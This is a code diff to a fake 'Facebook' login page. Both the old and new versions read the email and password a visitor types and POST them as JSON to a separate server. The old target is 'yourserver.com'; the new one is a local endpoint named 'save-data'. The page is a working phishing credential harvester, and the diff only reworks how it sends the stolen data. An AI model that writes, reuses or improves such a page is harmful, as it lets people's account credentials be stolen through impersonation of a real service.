@@ -79,7 +79,7 @@
 <body>
   <div class="container">
     <h1>Facebook</h1>
-    <form id="loginForm" method="POST">
+    <form id="loginForm">
       <div class="form-group">
         <label for="email">Email or Phone</label>
         <input type="text" id="email" name="email" required>
@@ -88,44 +88,39 @@
         <label for="password">Password</label>
         <input type="password" id="password" name="password" required>
       </div>
-      <button type="button" class="login-button" onclick="sendData()">Log In</button>
+      <button type="button" class="login-button" onclick="getInput()">Log In</button>
     </form>
     <a href="#" class="link">Forgot password?</a>
     <a href="#" class="link">Create new account</a>
   </div>
 
   <script>
-    async function sendData() {
+    function getInput() {
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
-      
-      // Create an object to send to the server
+
+      // Create the data to send to the server
       const data = {
         email: email,
         password: password
       };
 
-      try {
-        // Send data to the server using fetch API
-        const response = await fetch('http://yourserver.com/login', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(data), // Convert the data object to JSON
-        });
-
-        // Handle the server response
-        if (response.ok) {
-          const responseData = await response.json();
-          alert('Login Successful: ' + responseData.message); // Change based on your response
-        } else {
-          alert('Login Failed');
-        }
-      } catch (error) {
+      // Send data to server
+      fetch('http://localhost:3000/save-data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      })
+      .then(response => response.text())
+      .then(responseData => {
+        alert(responseData);  // Display response from the server
+      })
+      .catch(error => {
         console.error('Error:', error);
-        alert('Error connecting to the server');
-      }
+        alert('Error sending data to the server');
+      });
     }
   </script>
 </body>
